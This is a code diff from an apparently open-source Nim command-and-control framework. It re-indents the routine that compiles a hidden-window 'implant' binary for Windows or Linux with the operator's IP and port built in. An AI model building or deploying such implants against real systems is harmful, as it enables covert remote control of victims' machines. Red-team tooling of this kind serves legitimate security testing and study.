@@ -28,24 +28,24 @@ proc execProc*(args: seq[string], server: C2Server) {.async.} =
           port = $tcpListener.port
         else:
           errorLog "couldn't find tcp listener"
-      elif argsn == 5:
-        platform = args[4]
-        ip = args[2]
-        port = args[3]
-      if not failed:
-        let compileCommand = "nim c -d:client " &
-          "--app=gui " & # disable window lol 
-          "-d:ip=" & ip & " " & 
-          "-d:port=" & port & " " & 
-          (if platform == "windows": "-d:mingw" else: "--os:linux") & " " & 
-          "-o:implant" & (if platform == "windows": ".exe " else: " ") & 
-          "./src/client/client.nim"
-        echo "Running " & compileCommand
-        let exitCode = execCmd(compileCommand)
-        if exitCode != 0:
-          errorLog "failed to build implant, check https://github.com/d4rckh/nimc2/wiki/FAQs"
-        else:
-          infoLog "saved implant to implant" & (if platform == "windows": ".exe " else: " ") 
+    elif argsn == 5:
+      platform = args[4]
+      ip = args[2]
+      port = args[3]
+    if not failed:
+      let compileCommand = "nim c -d:client " &
+        "--app=gui " & # disable window lol 
+        "-d:ip=" & ip & " " & 
+        "-d:port=" & port & " " & 
+        (if platform == "windows": "-d:mingw" else: "--os:linux") & " " & 
+        "-o:implant" & (if platform == "windows": ".exe " else: " ") & 
+        "./src/client/client.nim"
+      echo "Running " & compileCommand
+      let exitCode = execCmd(compileCommand)
+      if exitCode != 0:
+        errorLog "failed to build implant, check https://github.com/d4rckh/nimc2/wiki/FAQs"
+      else:
+        infoLog "saved implant to implant" & (if platform == "windows": ".exe " else: " ") 
   else:
       errorLog "incorrect usage, check https://github.com/d4rckh/nimc2/wiki/Usage#generating-an-implant"
 
